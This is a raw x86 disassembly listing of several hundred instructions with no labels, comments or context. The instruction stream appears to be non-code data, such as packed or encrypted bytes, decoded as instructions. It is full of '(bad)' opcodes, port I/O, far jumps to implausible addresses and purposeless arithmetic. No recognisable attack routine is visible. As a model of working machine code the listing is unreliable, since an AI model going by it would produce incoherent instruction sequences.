  4145e2:	adc    BYTE PTR ds:0x114ef7a9,dh
  4145e8:	shr    DWORD PTR [ecx],1
  4145ea:	xor    al,0xdd
  4145ec:	sbb    DWORD PTR [edi],ebx
  4145ee:	pop    esp
  4145ef:	xlat   BYTE PTR ds:[ebx]
  4145f0:	mov    gs,WORD PTR [ecx]
  4145f2:	push   ebp
  4145f3:	loop   0x4145e0
  4145f5:	sub    ah,BYTE PTR [esp+ebp*4]
  4145f8:	(bad)  
  4145f9:	jecxz  0x4145cd
  4145fb:	pop    edi
  4145fc:	out    dx,al
  4145fd:	inc    ebp
  4145fe:	dec    esp
  4145ff:	fwait
  414600:	push   esp
  414601:	cmp    bh,BYTE PTR [ebx]
  414603:	xchg   DWORD PTR [edx+ebx*2-0x1a628866],esp
  41460a:	xor    eax,edx
  41460c:	dec    esi
  41460d:	jp     0x41459f
  41460f:	in     al,0x9a
  414611:	arpl   WORD PTR [ecx-0x39],sp
  414614:	pop    esp
  414615:	outs   dx,BYTE PTR ds:[esi]
  414616:	js     0x414663
  414618:	jmp    0xdd7356a6
  41461d:	fdiv   DWORD PTR [esp+edx*1]
  414620:	inc    ecx
  414621:	mov    edi,DWORD PTR ds:0x46e9c710
  414627:	int3   
  414628:	mov    esi,0x2926479c
  41462d:	ret    0x9391
  414630:	xor    al,0x5f
  414632:	loope  0x4145f9
  414634:	and    edx,DWORD PTR [edx+0x4]
  414637:	push   ss
  414638:	push   ss
  414639:	(bad)  
  41463a:	jecxz  0x414619
  41463c:	lock add ah,BYTE PTR [ebx+edi*1+0x4a]
  414641:	jge    0x4146ab
  414643:	ins    BYTE PTR es:[edi],dx
  414644:	adc    ch,dl
  414646:	add    ch,BYTE PTR [ecx+0x19]
  414649:	push   ecx
  41464a:	sub    ch,BYTE PTR [ecx-0x3]
  41464d:	fdiv   QWORD PTR [edi+esi*1+0x28c9eb15]
  414654:	inc    esi
  414655:	xchg   DWORD PTR [edx],esp
  414657:	adc    eax,0x4bbaa074
  41465c:	in     eax,0x43
  41465e:	push   es
  41465f:	cmp    esi,ebx
  414661:	retf   
  414662:	dec    ebp
  414663:	ins    DWORD PTR es:[edi],dx
  414664:	or     DWORD PTR [ecx-0x259479d0],ebx
  41466a:	adc    BYTE PTR [ebx-0x31a4fcb0],0xd
  414671:	in     al,dx
  414672:	lods   al,BYTE PTR ds:[esi]
  414673:	or     edi,DWORD PTR [edx]
  414675:	pop    ds
  414676:	je     0x4146d7
  414678:	sbb    eax,DWORD PTR [ecx+0x10]
  41467b:	mov    esi,0xbd51fdd
  414680:	push   esp
  414681:	push   ss
  414682:	and    ebx,DWORD PTR [ecx+0x48fec71a]
  414688:	lds    ecx,FWORD PTR [ebx]
  41468a:	rcl    BYTE PTR [edi-0x6e9cafba],cl
  414690:	mov    ebp,DWORD PTR [ebx]
  414692:	and    DWORD PTR [edx],ebx
  414694:	lock nop
  414696:	ret    0x9026
  414699:	popa   
  41469a:	scas   eax,DWORD PTR es:[edi]
  41469b:	in     al,dx
  41469c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41469d:	inc    edi
  41469e:	and    BYTE PTR [esi],ch
  4146a0:	or     dl,cl
  4146a2:	mov    DWORD PTR [esi-0x6724c46a],edi
  4146a8:	gs and cl,dh
  4146ab:	shr    BYTE PTR [edi],0x4e
  4146ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146af:	(bad)  
  4146b0:	dec    ecx
  4146b1:	mov    ah,0x8f
  4146b3:	adc    al,0xf7
  4146b5:	repnz mov dl,0x33
  4146b8:	sahf   
  4146b9:	leave  
  4146ba:	or     BYTE PTR ds:0x40e714e7,0x2
  4146c1:	push   0x2d
  4146c3:	and    eax,0xb92cc7d
  4146c8:	cdq    
  4146c9:	outs   dx,DWORD PTR ds:[esi]
  4146ca:	daa    
  4146cb:	add    al,0xa1
  4146cd:	js     0x4146a9
  4146cf:	add    ah,BYTE PTR [ebx-0x4779727f]
  4146d5:	iret   
  4146d6:	push   0xa1264f9c
  4146db:	push   edi
  4146dc:	cli    
  4146dd:	cwde   
  4146de:	or     eax,0x2132abb
  4146e3:	mov    al,ds:0x42632451
  4146e8:	sub    al,0xcf
  4146ea:	retf   
  4146eb:	adc    al,0x68
  4146ed:	xor    bl,ch
  4146ef:	inc    esi
  4146f0:	stos   DWORD PTR es:[edi],eax
  4146f1:	xor    DWORD PTR cs:[ebp+0x6e],ebp
  4146f5:	in     al,0x4a
  4146f7:	lods   al,BYTE PTR ds:[esi]
  4146f8:	and    eax,ebp
  4146fa:	in     eax,dx
  4146fb:	mul    BYTE PTR [edi]
  4146fd:	repnz xor dh,BYTE PTR [esi-0x10]
  414701:	xor    dl,BYTE PTR [ebx+0x56]
  414704:	mov    eax,eax
  414706:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414707:	jne    0x414770
  414709:	dec    ecx
  41470a:	les    esi,FWORD PTR [ecx+0x3e173219]
  414710:	retf   
  414711:	bound  eax,QWORD PTR [ecx]
  414713:	cdq    
  414714:	loopne 0x414746
  414716:	mov    edx,0xed598404
  41471b:	fdivr  QWORD PTR [esi+0x23]
  41471e:	aaa    
  41471f:	out    dx,al
  414720:	pop    ss
  414721:	cmp    al,0xbb
  414723:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414724:	es popf 
  414726:	add    dl,BYTE PTR [ebx]
  414728:	dec    ebp
  414729:	mov    ch,BYTE PTR [ebx]
  41472b:	mov    ebx,0xbcc310a8
  414730:	rcl    al,1
  414732:	cmp    al,0xef
  414734:	aas    
  414735:	cs pop ss
  414737:	xchg   ebp,eax
  414738:	jae    0x4146d5
  41473a:	loopne 0x414748
  41473c:	add    dl,cl
  41473e:	pop    es
  41473f:	mov    ah,0xaf
  414741:	sbb    BYTE PTR [ecx-0x72dc3f23],0x38
  414748:	add    ch,BYTE PTR [esi-0x185bf002]
  41474e:	jp     0x41474c
  414750:	shr    BYTE PTR [edi],1
  414752:	loope  0x414773
  414754:	test   al,0x16
  414756:	and    al,0xfe
  414758:	mov    ebp,0x8233d9fb
  41475d:	push   ecx
  41475e:	pop    esp
  41475f:	enter  0xf632,0x8
  414763:	sbb    eax,0xfbe84d68
  414768:	sbb    BYTE PTR [edx-0x5f],0x2d
  41476c:	mov    ah,0x16
  41476e:	mov    eax,ds:0xb138c59c
  414773:	add    eax,0xf3a1f4da
  414778:	shl    BYTE PTR [ecx-0xdc0d647],0x6f
  41477f:	ret    
  414780:	cmp    BYTE PTR [edx-0x1f4e3868],0x24
  414787:	mov    dl,BYTE PTR [edx-0x15fbacab]
  41478d:	fiadd  DWORD PTR [ecx+ebx*8+0x5c]
  414791:	mov    ds:0xe7ae66a9,al
  414796:	jns    0x414735
  414798:	sbb    eax,0xe2c04520
  41479d:	pop    ebx
  41479e:	aaa    
  41479f:	pop    esp
  4147a0:	sbb    eax,0x124595ea
  4147a5:	push   es
  4147a6:	outs   dx,BYTE PTR ds:[esi]
  4147a7:	xor    eax,0x1007219d
  4147ac:	test   BYTE PTR [edx-0x57],ah
  4147af:	cmc    
  4147b0:	outs   dx,DWORD PTR ds:[esi]
  4147b1:	and    DWORD PTR [ebx],esp
  4147b3:	pop    esp
  4147b4:	push   esi
  4147b5:	lahf   
  4147b6:	and    BYTE PTR [eax],dh
  4147b8:	imul   esi,DWORD PTR [ebx],0xfffffff9
  4147bb:	sahf   
  4147bc:	mov    bh,0xd5
  4147be:	cmp    eax,0x39
  4147c1:	pop    ss
  4147c2:	scas   al,BYTE PTR es:[edi]
  4147c3:	fadd   QWORD PTR [esi+esi*1]
  4147c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4147c7:	addr16 pop eax
  4147c9:	inc    ecx
  4147ca:	fcomip st,st(2)
  4147cc:	hlt    
  4147cd:	scas   al,BYTE PTR es:[edi]
  4147ce:	aas    
  4147cf:	xchg   esi,eax
  4147d0:	xchg   esp,eax
  4147d1:	mov    edi,0x479ed042
  4147d6:	sbb    esi,edi
  4147d8:	out    dx,eax
  4147d9:	adc    eax,0xffaa0609
  4147de:	xchg   edx,eax
  4147df:	mov    ebx,0xe2a4aada
  4147e4:	mov    bh,0xdc
  4147e6:	or     ah,BYTE PTR [edx]
  4147e8:	nop
  4147e9:	cmp    bl,dh
  4147eb:	test   BYTE PTR [eax],dh
  4147ed:	nop
  4147ee:	mov    eax,ds:0xb9c10203
  4147f3:	add    eax,0x6a67968f
  4147f8:	int    0x3
  4147fa:	je     0x41480f
  4147fc:	push   ebx
  4147fd:	push   ds
  4147fe:	int    0xb8
  414800:	in     al,dx
  414801:	push   eax
  414802:	xchg   dx,sp
  414805:	inc    edx
  414806:	adc    eax,esi
  414808:	mov    ah,0x7a
  41480a:	jo     0x41482d
  41480c:	sti    
  41480d:	(bad)
  414810:	es lahf 
  414812:	adc    DWORD PTR [edi-0x13479eed],esi
  414818:	lea    ebp,[esi]
  41481a:	cld    
  41481b:	pop    eax
  41481c:	push   esi
  41481d:	xchg   edx,eax
  41481e:	lock call 0xe4d7b832
  414824:	mov    ch,0xe0
  414826:	test   dh,0x24
  414829:	pop    ds
  41482a:	pop    ebp
  41482b:	dec    esi
  41482c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41482d:	add    esp,DWORD PTR [ecx]
  41482f:	sub    BYTE PTR [eax-0x7d],0xa4
  414833:	adc    eax,0xd82aab38
  414838:	sub    edi,esp
  41483a:	pop    es
  41483b:	sub    al,0xed
  41483d:	xchg   BYTE PTR [ebp-0x42],dl
  414840:	dec    edx
  414841:	lahf   
  414842:	adc    al,0xaa
  414844:	mov    es,WORD PTR [esi-0x4e]
  414847:	icebp  
  414848:	xchg   ebp,eax
  414849:	mov    al,ds:0xa5d0c13c
  41484e:	dec    esp
  41484f:	imul   esi,DWORD PTR ds:0xc4b8cc82,0xebd134ff
  414859:	fldenv [eax+0x4d091243]
  41485f:	xchg   esp,eax
  414860:	popa   
  414861:	imul   ebp,DWORD PTR [edx],0xc0851ab4
  414867:	fnsave [edx-0x5a]
  41486a:	rcr    DWORD PTR [ecx],1
  41486c:	mov    esi,0xc119008f
  414871:	in     eax,0x74
  414873:	cmp    al,0x95
  414875:	add    al,0xaa
  414877:	pop    esp
  414878:	popf   
  414879:	lds    esp,FWORD PTR [ebp+eax*1-0x16cdb56b]
  414880:	adc    eax,0x8a70c06e
  414885:	jge    0x414824
  414887:	push   edx
  414888:	aas    
  414889:	lds    ebp,FWORD PTR [esi+0x13]
  41488c:	out    0x3b,al
  41488e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41488f:	out    dx,al
  414890:	lea    esp,[esi+0x70d5a4da]
  414896:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414897:	jp     0x4148f1
  414899:	fidiv  DWORD PTR [ecx+0x60fad4d9]
  41489f:	stc    
  4148a0:	jge    0x4148ee
  4148a2:	fwait
  4148a3:	jp     0x41490a
  4148a5:	add    BYTE PTR [ecx+0x5efeba61],dl
  4148ab:	inc    ebp
  4148ac:	ret    0x50d4
  4148af:	dec    ebp
  4148b0:	out    0x27,al
  4148b2:	and    BYTE PTR [ecx+0xa18de7],ah
  4148b8:	arpl   dx,sp
  4148ba:	dec    edx
  4148bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148bc:	jle    0x41488d
  4148be:	mov    WORD PTR [ebp-0x75],gs
  4148c1:	mov    ch,0xa
  4148c3:	xchg   ecx,eax
  4148c4:	inc    eax
  4148c5:	push   ss
  4148c6:	aad    0x3d
  4148c8:	jne    0x4148cc
  4148ca:	pop    esp
  4148cb:	dec    ebp
  4148cc:	jge    0x4148bf
  4148ce:	ja     0x414939
  4148d0:	mov    DWORD PTR [edx],0x7c75042a
  4148d6:	hlt    
  4148d7:	inc    eax
  4148d8:	leave  
  4148d9:	and    eax,0xbf4217fe
  4148de:	or     DWORD PTR [esi-0xe0ff13a],edx
  4148e4:	das    
  4148e5:	fs mov edi,0x91ddf3fc
  4148eb:	xor    eax,0x9ffd3f57
  4148f0:	cmp    edi,esi
  4148f2:	test   eax,0xc4180173
  4148f7:	cmc    
  4148f8:	frstor [eax-0x456edb4f]
  4148fe:	sub    eax,0xba90374c
  414903:	rcr    edi,1
  414905:	cmp    ebx,DWORD PTR [ebx-0x60d2c985]
  41490b:	aas    
  41490c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41490d:	shr    DWORD PTR [edi-0x31],cl
  414910:	jp     0x4148eb
  414912:	cmp    eax,0x70001929
  414917:	(bad)
  41491c:	add    esi,ecx
  41491e:	mov    cl,0x79
  414920:	call   0x660a2a8e
  414925:	popa   
  414926:	out    0xef,al
  414928:	repnz test BYTE PTR fs:[ecx-0x2030aeba],0x59
  414931:	mov    eax,0xb6097cee
  414936:	xchg   esi,eax
  414937:	fbstp  TBYTE PTR [edx-0x71]
  41493a:	mov    al,ds:0xc56d1299
  41493f:	add    DWORD PTR [eax-0x4d],ebx
  414942:	jl     0x4149b6
  414944:	das    
  414945:	int    0x4
  414947:	test   dh,0xc5
  41494a:	call   0xa70d67be
  41494f:	lods   eax,DWORD PTR ds:[esi]
  414950:	and    BYTE PTR [ebx-0xd],bl
  414953:	mov    ah,BYTE PTR [eax]
  414955:	add    eax,0x7fa3aec8
  41495a:	xor    dh,BYTE PTR [ebx]
  41495c:	cdq    
  41495d:	jmp    0x414904
  41495f:	ds aad 0x1e
  414962:	cmc    
  414963:	(bad)  
  414964:	xor    BYTE PTR [ebx+ebp*1-0x68bc27f5],cl
  41496b:	jno    0x4149cb
  41496d:	push   edi
  41496e:	xchg   esp,eax
  41496f:	inc    eax
  414970:	jnp    0x414935
  414972:	jnp    0x414918
  414974:	sar    BYTE PTR [ecx],0x15
  414977:	mov    esi,0x53fdd4b9
  41497c:	shl    ebx,0x1d
  41497f:	lods   eax,DWORD PTR ds:[esi]
  414980:	jae    0x4149c4
  414982:	inc    esi
  414983:	mov    BYTE PTR [ecx],dh
  414985:	inc    ebp
  414986:	(bad)  [edi]
  414988:	test   eax,0x823765fb
  41498d:	cmp    DWORD PTR [ebx-0x41d0c681],edx
  414993:	cmp    bh,bl
  414995:	inc    esi
  414996:	enter  0x3ffb,0xf6
  41499a:	mov    dh,0xd6
  41499c:	inc    ecx
  41499d:	fdivr  st,st(5)
  41499f:	add    ebp,DWORD PTR [ebp-0x59af13fc]
  4149a5:	sti    
  4149a6:	mov    eax,0x72f573c2
  4149ab:	ja     0x414951
  4149ad:	pop    ebp
  4149ae:	mov    al,ds:0xf0664028
  4149b3:	push   edx
  4149b4:	daa    
  4149b5:	xchg   ecx,eax
  4149b6:	inc    esi
  4149b7:	iret   
  4149b8:	inc    ecx
  4149b9:	add    al,bh
  4149bb:	sub    eax,0x27e9bf1
  4149c0:	inc    edi
  4149c1:	popf   
  4149c2:	or     ebx,DWORD PTR [edx+0x64]
  4149c5:	and    BYTE PTR [ecx],bh
  4149c7:	loopne 0x4149f2
  4149c9:	lods   eax,DWORD PTR ds:[esi]
  4149ca:	inc    eax
  4149cb:	xor    ecx,edx
  4149cd:	mov    bl,0x2d
  4149cf:	adc    DWORD PTR [edx],ebp
  4149d1:	xchg   ecx,eax
  4149d2:	cdq    
  4149d3:	add    BYTE PTR ds:0xc4000e5e,al
  4149d9:	adc    DWORD PTR [ebp-0x4d],ecx
  4149dc:	mov    al,0xfc
  4149de:	call   0xdc2:0x2c688009
  4149e5:	imul   edi,DWORD PTR [edi-0x30],0xffffffe7
  4149e9:	push   eax
  4149ea:	sub    BYTE PTR [esi-0x361aaade],ch
  4149f0:	mov    esp,0x332386b2
  4149f5:	cld    
  4149f6:	pop    ds
  4149f7:	(bad)  
  4149f8:	retf   
  4149f9:	and    DWORD PTR [ebx+0x6a227798],eax
  4149ff:	push   es
  414a00:	ja     0x4149cc
  414a02:	add    BYTE PTR [edi],al
  414a04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414a05:	mov    eax,0x1cb1994d
  414a0a:	add    eax,0x1c484b6e
  414a0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a10:	jl     0x414a0a
  414a12:	loop   0x414a8c
  414a14:	repnz (bad) 
  414a16:	int3   
  414a17:	faddp  st(4),st
  414a19:	add    esp,edi
  414a1b:	ret    0x4adc
  414a1e:	jmp    0x414a7b
  414a20:	fdiv   QWORD PTR [ecx+eiz*2-0x64]
  414a24:	in     eax,dx
  414a25:	and    cl,BYTE PTR [bx+si-0xf]
  414a29:	shl    DWORD PTR [ebp-0x31],1
  414a2c:	push   eax
  414a2d:	ror    ebp,1
  414a2f:	pop    edx
  414a30:	in     al,0xf0
  414a32:	retf   
  414a33:	aaa    
  414a34:	loope  0x414a17
  414a36:	leave  
  414a37:	sbb    eax,0xfb2c907d
  414a3c:	sbb    ch,BYTE PTR [ecx+0x3c]
  414a3f:	bnd jns 0x414a08
  414a42:	push   ebx
  414a43:	inc    esp
  414a44:	push   ecx
  414a45:	jp     0x414a6d
  414a47:	sbb    al,0x9e
  414a49:	jns    0x414aa1
  414a4b:	jae    0x414aab
  414a4d:	cld    
  414a4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a4f:	xor    DWORD PTR [ebx-0x61a91742],ebx
  414a55:	pop    ebp
  414a56:	xor    DWORD PTR [eax-0x518a5690],0xffffffa5
  414a5d:	mov    bh,0x53
  414a5f:	or     eax,0x36a873fe
  414a64:	cwde   
  414a65:	loop   0x414ae4
  414a67:	stos   BYTE PTR es:[edi],al
  414a68:	sbb    DWORD PTR [ebp+0x15bbd48f],0xfac5674
  414a72:	push   es
  414a73:	mov    edi,0x33e4558b
  414a78:	(bad)  
  414a79:	jmp    0x416dee
  414a7e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414a7f:	xchg   esi,eax
  414a80:	retf   
  414a81:	dec    eax
  414a82:	mov    esp,edi
  414a84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a85:	xchg   esp,eax
  414a86:	dec    ecx
  414a87:	(bad)  
  414a88:	mov    ah,0x80
  414a8a:	xchg   edi,eax
  414a8b:	jmp    0x414af7
  414a8d:	adc    ebp,edi
  414a8f:	inc    edi
  414a90:	popa   
  414a91:	bound  ecx,QWORD PTR [edx]
  414a93:	pop    edi
  414a94:	bound  esp,QWORD PTR [edx-0x53]
  414a97:	adc    DWORD PTR [ebx+0x3a47feff],edi
  414a9d:	les    edi,FWORD PTR [ebx-0x691d4075]
  414aa3:	add    esp,ecx
  414aa5:	aaa    
  414aa6:	popa   
  414aa7:	jmp    0xcff2:0x9070
  414aad:	popf   
  414aae:	xchg   BYTE PTR [ebp+0x5eea3b86],ch
  414ab4:	shl    DWORD PTR [edx],0xdd
  414ab7:	popf   
  414ab8:	pop    esp
  414ab9:	mov    eax,ebp
  414abb:	test   DWORD PTR ds:0xafa5b8ec,edi
  414ac1:	xchg   esi,eax
  414ac2:	fist   WORD PTR [edi]
  414ac4:	scas   al,BYTE PTR es:[edi]
  414ac5:	imul   edx,DWORD PTR [ecx-0x74f26652],0x26
  414acc:	sbb    DWORD PTR [ebp+0x34],esi
  414acf:	call   0xefb6:0x6d8f5984
  414ad6:	pop    edi
  414ad7:	ret    
  414ad8:	pusha  
  414ad9:	xchg   ebp,eax
  414ada:	inc    edx
  414adb:	and    cl,BYTE PTR [eax+0x5d]
  414ade:	and    ecx,edi
  414ae0:	cld    
  414ae1:	cli    
  414ae2:	retf   0xb689
  414ae5:	mov    dl,0xc3
  414ae7:	inc    edi
  414ae8:	out    dx,eax
  414ae9:	mov    cl,0xaa
  414aeb:	sub    al,dh
  414aed:	xor    DWORD PTR [edx],esi
  414aef:	out    0x69,eax
  414af1:	sub    BYTE PTR fs:[ecx+0x4271b8f4],dh
  414af8:	pop    es
  414af9:	jge    0x414adb
  414afb:	(bad)  
  414afc:	xor    DWORD PTR [edx-0x64ec059e],edx
  414b02:	xchg   esp,eax
  414b03:	lock add BYTE PTR [esi+0x5aff2db7],al
  414b0a:	fist   WORD PTR [ebx-0x6ba513ba]
  414b10:	sub    DWORD PTR [edi+edi*2],edi
  414b13:	cwde   
  414b14:	add    ah,al
  414b16:	pop    es
  414b17:	pop    ebx
  414b18:	push   esp
  414b19:	mov    ebx,0xab34767
  414b1e:	or     bl,BYTE PTR ds:0x645ce013
  414b24:	clc    
  414b25:	jge    0x414b53
  414b27:	cwde   
  414b28:	jns    0x414b8c
  414b2a:	rcr    BYTE PTR [esi+0x79],1
  414b2d:	cmp    DWORD PTR [esi+esi*2],esi
  414b30:	push   edi
  414b31:	inc    ch
  414b33:	popf   
  414b34:	loope  0x414af4
  414b36:	pusha  
  414b37:	mov    cl,0x86
  414b39:	dec    eax
  414b3a:	and    bl,BYTE PTR [ebx]
  414b3c:	and    eax,0x8c3d574b
  414b41:	dec    ebp
  414b42:	outs   dx,BYTE PTR ds:[esi]
  414b43:	sub    eax,0x20e4f1ef
  414b48:	pop    esi
  414b49:	fwait
  414b4a:	sub    DWORD PTR [esi+0xf],esp
  414b4d:	enter  0x151c,0xa9
  414b51:	std    
  414b52:	sbb    eax,0xc0803d8b
  414b57:	jb     0x414ae8
  414b59:	push   edi
  414b5a:	jbe    0x414b35
  414b5c:	mov    ecx,0x246c16d
  414b61:	jmp    0x8781:0x22dfbb65
  414b68:	xor    eax,0x3918fb16
  414b6d:	pusha  
  414b6e:	mov    cl,0xef
  414b70:	faddp  st(7),st
  414b72:	outs   dx,DWORD PTR ds:[esi]
  414b73:	pushf  
  414b74:	stos   BYTE PTR es:[edi],al
  414b75:	int    0x3d
  414b77:	mov    esp,0x779c8c87
  414b7c:	cdq    
  414b7d:	lea    esi,[ecx-0x4c]
  414b80:	inc    edx
  414b81:	inc    edi
  414b82:	sti    
  414b83:	test   ebp,eax
  414b85:	lods   al,BYTE PTR ds:[esi]
  414b86:	push   cs
  414b87:	into   
  414b88:	cli    
  414b89:	mov    edx,0x1cebf606
  414b8e:	add    al,0x72
  414b90:	mov    esp,0x97d7d6dc
  414b95:	inc    edi
  414b96:	data16 (bad) 
  414b98:	ss push esp
  414b9a:	in     al,dx
  414b9b:	sub    BYTE PTR [ebp-0xd5000f4],bl
  414ba1:	stos   DWORD PTR es:[edi],eax
  414ba2:	lds    ebp,FWORD PTR [edx+edx*1]
  414ba5:	test   BYTE PTR [ebx+0x7c1d61a3],cl
  414bab:	push   cs
  414bac:	cmp    dl,al
  414bae:	cwde   
  414baf:	(bad)  
  414bb0:	jmp    0xe7bf:0x212daa2d
  414bb7:	sbb    bl,al
  414bb9:	push   ebp
  414bba:	cmp    al,0x1b
  414bbc:	xchg   ebx,eax
  414bbd:	loop   0x414b54
  414bbf:	sbb    esp,DWORD PTR [edx+eiz*4]
  414bc2:	fistp  WORD PTR [ebx+0x78]
  414bc5:	sub    DWORD PTR [edx+0x29af5556],esi
  414bcb:	xor    ecx,DWORD PTR [ebp+0x3e]
  414bce:	or     dl,bh
  414bd0:	into   
  414bd1:	and    esp,eax
  414bd3:	(bad)  
  414bd4:	mov    ah,0x53
  414bd6:	mov    WORD PTR [esi+0x21b1c0ac],fs
  414bdc:	xor    al,0x8
  414bde:	out    0x5f,al
  414be0:	adc    DWORD PTR [edx+0x63],ecx
  414be3:	adc    ebx,DWORD PTR ds:0x20a51094
  414be9:	ja     0x414ba4
  414beb:	mov    bl,0x57
  414bed:	iret   
  414bee:	outs   dx,BYTE PTR ds:[esi]
  414bef:	fst    DWORD PTR [edi+0x1c]
  414bf2:	fistp  DWORD PTR [ebx]
  414bf4:	inc    eax
  414bf5:	std    
  414bf6:	mov    dh,0xd4
  414bf8:	inc    esp
  414bf9:	in     al,dx
  414bfa:	fsub   st(1),st
  414bfc:	shl    BYTE PTR [edx-0x2cf82782],cl
  414c02:	nop
  414c03:	cmp    al,0x61
  414c05:	sti    
  414c06:	not    DWORD PTR [ebx]
  414c08:	bound  edx,QWORD PTR [eax+eiz*1-0x3]
  414c0c:	sub    BYTE PTR [edx+0x67c30471],al
  414c12:	jb     0x414b96
  414c14:	popf   
  414c15:	test   DWORD PTR [ecx+0x1e],eax
  414c18:	hlt    
  414c19:	dec    ecx
  414c1a:	inc    BYTE PTR [ecx-0xd]
  414c1d:	dec    edi
  414c1e:	ja     0x414c50
  414c20:	adc    cl,BYTE PTR [ebp+0x2f]
  414c23:	dec    ebp
  414c24:	ds aad 0x56
  414c27:	test   al,0x73
  414c29:	fdivr  QWORD PTR ds:0x5da3b9d0
  414c2f:	ins    BYTE PTR es:[edi],dx
  414c30:	jno    0x414bee
  414c32:	xchg   ebx,eax
  414c33:	or     edi,esi
  414c35:	adc    al,0xf7
  414c37:	xor    BYTE PTR [ecx-0xa],ah
  414c3a:	inc    edi
  414c3b:	mov    dl,0x9
  414c3d:	xchg   ecx,eax
  414c3e:	pop    edx
  414c3f:	bt     DWORD PTR [edi+ebp*1],ebx
  414c43:	xchg   esp,eax
  414c44:	lahf   
  414c45:	jge    0x414bf2
  414c47:	sbb    cl,BYTE PTR [ebx-0x43d17cf0]
  414c4d:	mov    dl,ch
  414c4f:	push   ebx
  414c50:	fbld   TBYTE PTR [ebx-0x72]
  414c53:	inc    ecx
  414c54:	xchg   ecx,eax
  414c55:	ja     0x414c73
  414c57:	cmp    eax,0xafdc2d68
  414c5c:	int3   
  414c5d:	out    dx,eax
  414c5e:	sbb    al,0x6b
  414c60:	(bad)  
  414c61:	adc    ecx,DWORD PTR [esi-0x3798b1f4]
  414c67:	adc    BYTE PTR [edx-0x5],0x14
  414c6b:	sub    BYTE PTR [edx-0x7c23981a],al
  414c71:	das    
  414c72:	shr    cl,1
  414c74:	fidiv  DWORD PTR [edx+eiz*1+0x75109055]
  414c7b:	in     eax,dx
  414c7c:	adc    bl,BYTE PTR [ebp-0x23796138]
  414c82:	sub    BYTE PTR [ebx+edi*1-0x65],cl
  414c86:	dec    ebp
  414c87:	es mov al,0x3a
  414c8a:	and    BYTE PTR [ebp-0x4c45fe5e],ch
  414c90:	das    
  414c91:	bnd jge 0x414ce0
  414c94:	push   ss
  414c95:	(bad)  
  414c96:	or     DWORD PTR [ebp-0x76c9cfda],ebp
  414c9c:	xor    DWORD PTR [ebx],edx
  414c9e:	dec    edi
  414c9f:	stos   DWORD PTR es:[edi],eax
  414ca0:	scas   eax,DWORD PTR es:[edi]
  414ca1:	cmp    ch,bl
  414ca3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ca4:	or     BYTE PTR [ebx+0x422d1eef],dl
  414caa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cab:	dec    ebx
  414cac:	paddsb mm7,QWORD PTR ds:0x937a9dee
  414cb3:	(bad)  
  414cb4:	hlt    
  414cb5:	mov    ecx,0xc1125237
  414cba:	jns    0x414c9b
  414cbc:	into   
  414cbd:	enter  0x8428,0x40
  414cc1:	add    BYTE PTR [esi-0x63],ah
  414cc4:	push   cs
  414cc5:	fist   WORD PTR [ebx+ebx*1+0x2d64ab12]
  414ccc:	push   ss
  414ccd:	ja     0x414c5b
  414ccf:	push   edi
  414cd0:	inc    edx
  414cd1:	pusha  
  414cd2:	lods   eax,DWORD PTR ds:[esi]
  414cd3:	mov    al,0xb6
  414cd5:	enter  0xe9d4,0xda
  414cd9:	push   cs
  414cda:	push   ecx
  414cdb:	pop    ss
  414cdc:	pop    ebx
  414cdd:	mov    dl,0x8f
  414cdf:	bound  edi,QWORD PTR [ecx-0x2f]
  414ce2:	(bad)
  414ce5:	lahf   
  414ce6:	repnz pop ds
  414ce8:	cs stc 
  414cea:	sbb    eax,ecx
  414cec:	jg     0x414ce7
  414cee:	arpl   WORD PTR [eax],di
  414cf0:	std    
  414cf1:	(bad)  
  414cf2:	(bad)  
  414cf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cf4:	stc    
  414cf5:	sub    ebp,ebx
  414cf7:	push   esp
  414cf8:	test   eax,0x8dd64c37
  414cfd:	mov    ch,0xb6
  414cff:	sar    BYTE PTR [edx-0x11],1
  414d02:	xor    al,0xef
  414d04:	jmp    0x79eb9a1
  414d09:	(bad)  
  414d0a:	jle    0x414cb2
  414d0c:	or     edx,ecx
  414d0e:	mov    esp,esp
  414d10:	xchg   DWORD PTR [eax],eax
  414d12:	mov    eax,ds:0xfd92301b
  414d17:	mov    edi,0xe94cd7c6
  414d1c:	outs   dx,BYTE PTR ds:[esi]
  414d1d:	das    
  414d1e:	(bad)  
  414d1f:	cmp    ebx,esp
  414d21:	xor    eax,0x6306b4fa
  414d26:	mov    BYTE PTR [edx-0x7b3d86b2],dh
  414d2c:	loopne 0x414da1
  414d2e:	dec    esp
  414d2f:	mov    cl,0xe0
  414d31:	mov    al,0x61
  414d33:	pop    edx
  414d34:	xchg   ebx,eax
  414d35:	xor    al,0x53
  414d37:	pop    ebx
  414d38:	sbb    al,0xfc
  414d3a:	mov    ebp,0x713cfcb
  414d3f:	xor    BYTE PTR [ebx+0x1b28f79d],dh
  414d45:	int    0xf6
  414d47:	jl     0x414d53
  414d49:	icebp  
  414d4a:	inc    esi
  414d4b:	and    eax,0x5cb69536
  414d50:	adc    DWORD PTR [esp+eax*8],ebx
  414d53:	outs   dx,DWORD PTR ds:[esi]
  414d54:	jp     0x414d4d
  414d56:	rcl    BYTE PTR [ebx+0x7c],1
  414d59:	mov    ch,0x20
  414d5b:	sub    DWORD PTR [ebp+0x6a816313],esp
  414d61:	leave  
  414d62:	add    DWORD PTR [edi-0x77],ecx
  414d65:	mov    ebx,0x8203dc59
  414d6a:	xchg   esp,eax
  414d6b:	mov    dl,0x81
  414d6d:	and    dl,BYTE PTR [edx]
  414d6f:	hlt    
